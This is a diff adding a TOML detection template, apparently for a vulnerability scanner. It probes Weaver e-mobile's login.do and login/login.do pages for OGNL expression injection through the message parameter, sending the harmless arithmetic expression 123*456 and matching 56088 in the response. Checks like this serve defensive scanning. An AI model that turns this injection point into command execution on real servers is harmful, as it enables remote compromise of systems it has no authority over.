@@ -1,0 +1,53 @@
+[info]
+id = "POC-AVE-2026-0026"
+name = "泛微e-mobile OGNL注入漏洞 PoC"
+author = "AVE"
+severity = "high"
+tags = ["ognl-injection", "rce", "cnvd-2017"]
+description = "泛微e-mobile的login.do和login/login.do页面message参数存在OGNL表达式注入漏洞，攻击者可利用该漏洞执行任意OGNL表达式，实现远程命令执行"
+vuln_id = ["CNVD-2017-03561", "AVE-2026-0026"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/login.do"
+
+[poc.requests.query]
+message = "123*456"
+
+[[poc.requests.headers]]
+User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["56088"]
+expect = true
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/login/login.do"
+
+[poc.requests.query]
+message = "123*456"
+
+[[poc.requests.headers]]
+User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["56088"]
+expect = true
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
